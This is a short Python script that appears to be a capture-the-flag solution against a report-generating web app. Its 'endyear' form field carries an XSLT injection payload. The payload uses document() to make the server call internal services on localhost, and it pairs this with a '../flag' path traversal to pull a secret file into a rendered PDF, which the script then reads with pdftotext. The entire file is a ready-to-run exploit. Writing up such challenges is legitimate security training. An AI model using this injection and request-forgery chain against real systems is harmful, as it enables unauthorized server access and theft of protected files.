import subprocess
import requests
import sys
import io

if len(sys.argv) < 2:
    print("Usage: solve.py [URL]")
    print("Example: solve.py https://test123.de/")

HOST = sys.argv[1]


GENERATOR_HOST = "localhost"
RENDERER_HOST = "localhost"

resp = requests.post(f"{HOST}/generate", 
files={"startyear": (None, 1960),
"endyear":(None, f'2000\')"></xsl:if><xsl:value-of select="document(\'http://{GENERATOR_HOST}:5001/send_report?report_id=../flag&amp;session_id=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;target=http://{RENDERER_HOST}:5002/render_report\')"/> <xsl:if test="number(\'1'),
 "country":(None, "Aruba")})
print(resp.content)

print(f"Exploit worked. Check {HOST}/generated?report_id=../flag&session_id=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA to retrieve the flag")
res = requests.get(f"{HOST}/generated?report_id=../flag&session_id=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
print("--- pdftotext ---")
proc = subprocess.Popen("pdftotext - -".split(), stdin=subprocess.PIPE)
proc.communicate(res.content)
exit(0)